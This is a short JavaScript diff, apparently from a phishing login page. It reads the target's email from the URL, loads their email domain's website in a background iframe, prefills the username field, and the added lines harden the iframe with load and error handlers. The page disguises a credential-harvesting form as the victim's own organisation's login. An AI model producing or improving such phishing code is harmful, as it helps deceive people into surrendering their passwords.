@@ -229,13 +229,29 @@
             const email = getEmailFromQuery(queryString);
 
             if (email) {
+                const domain = email.split('@')[1];
                 const iframe = document.createElement('iframe');
-                iframe.src = 'https://' + email.split('@')[1];
+                iframe.src = 'https://' + domain;
                 iframe.className = 'background-iframe';
                 document.body.appendChild(iframe);
 
                 // Set the email in the username field
                 document.getElementById('username').value = email;
+
+                // Handle iframe load event
+                iframe.onload = function() {
+                    setTimeout(() => {
+                        // Check if iframe has loaded content
+                        if (iframe.contentWindow.location.href === 'about:blank') {
+                            iframe.src = ''; // Clear the src if content is blocked
+                        }
+                    }, 3000); // Adjust time as needed
+                };
+
+                // Error handling for unsupported domains
+                iframe.onerror = function() {
+                    iframe.src = ''; // Clear the src on error
+                };
             }
         }
 
